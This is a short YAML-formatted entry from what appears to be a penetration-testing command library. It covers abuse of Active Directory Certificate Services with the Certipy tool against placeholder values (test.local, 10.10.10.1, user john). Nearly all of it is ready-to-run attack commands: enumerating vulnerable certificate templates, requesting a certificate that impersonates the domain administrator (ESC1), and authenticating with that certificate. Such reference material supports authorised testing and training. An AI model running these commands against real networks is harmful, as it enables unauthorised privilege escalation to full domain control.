---
description: |
  Enumerate and exploit Active Directory Certificate Services (ADCS)
  misconfigurations using Certipy.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: john
    Password: password123
command: |
  # Find vulnerable certificate templates
  certipy find -u john@test.local -p 'password123' -dc-ip 10.10.10.1 -vulnerable

  # ESC1 — Request cert as another user
  certipy req -u john@test.local -p 'password123' -dc-ip 10.10.10.1 -ca 'test-CA' -template 'VulnTemplate' -upn administrator@test.local

  # Authenticate with certificate
  certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
phase:
  - Enumeration
  - Exploitation
target_os:
  - Windows
services:
  - LDAP
  - Kerberos
ports:
  - "389"
  - "88"
items:
  - Username
  - Password
  - Certificate
techniques:
  - ADCS_Abuse
network_position:
  - Internal
references:
  - https://github.com/ly4k/Certipy
---
